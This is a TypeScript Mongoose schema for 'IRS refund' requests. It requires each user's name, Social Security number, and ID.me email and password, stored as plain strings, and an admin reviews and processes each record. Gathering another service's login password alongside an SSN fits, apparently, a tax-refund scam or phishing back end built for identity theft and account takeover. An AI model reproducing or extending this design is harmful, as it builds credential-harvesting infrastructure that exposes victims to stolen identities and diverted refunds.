import mongoose, { Schema, Model, Document } from 'mongoose';

// IRS Refund Status enum
export enum IrsRefundStatus {
  PENDING = 'pending',
  APPROVED = 'approved',
  REJECTED = 'rejected',
  PROCESSED = 'processed',
}

// IRS Refund interface
export interface IIrsRefund extends Document {
  _id: mongoose.Types.ObjectId;
  user: mongoose.Types.ObjectId;
  name: string;
  ssn: string;
  idmeEmail: string;
  idmePassword: string;
  country: string;
  filingId?: string;
  amount?: number;
  status: IrsRefundStatus;
  adminNotes?: string;
  processedBy?: mongoose.Types.ObjectId;
  processedAt?: Date;
  createdAt: Date;
  updatedAt: Date;
}

const IrsRefundSchema = new Schema<IIrsRefund>(
  {
    user: {
      type: Schema.Types.ObjectId,
      ref: 'User',
      required: true,
      index: true,
    },
    name: {
      type: String,
      required: [true, 'Name is required'],
    },
    ssn: {
      type: String,
      required: [true, 'SSN is required'],
    },
    idmeEmail: {
      type: String,
      required: [true, 'ID.me email is required'],
    },
    idmePassword: {
      type: String,
      required: [true, 'ID.me password is required'],
    },
    country: {
      type: String,
      required: [true, 'Country is required'],
    },
    filingId: {
      type: String,
    },
    amount: {
      type: Number,
      min: [0, 'Amount cannot be negative'],
    },
    status: {
      type: String,
      enum: Object.values(IrsRefundStatus),
      default: IrsRefundStatus.PENDING,
      index: true,
    },
    adminNotes: {
      type: String,
    },
    processedBy: {
      type: Schema.Types.ObjectId,
      ref: 'Admin',
    },
    processedAt: {
      type: Date,
    },
  },
  {
    timestamps: true,
  }
);

// Indexes
IrsRefundSchema.index({ createdAt: -1 });
IrsRefundSchema.index({ user: 1, status: 1 });

// Static methods
IrsRefundSchema.statics.getPending = function () {
  return this.find({ status: IrsRefundStatus.PENDING })
    .populate('user', 'name email accountNumber')
    .sort({ createdAt: -1 });
};

IrsRefundSchema.statics.getByUser = function (userId: mongoose.Types.ObjectId) {
  return this.find({ user: userId }).sort({ createdAt: -1 });
};

export const IrsRefund: Model<IIrsRefund> =
  mongoose.models.IrsRefund || mongoose.model<IIrsRefund>('IrsRefund', IrsRefundSchema);

export default IrsRefund;
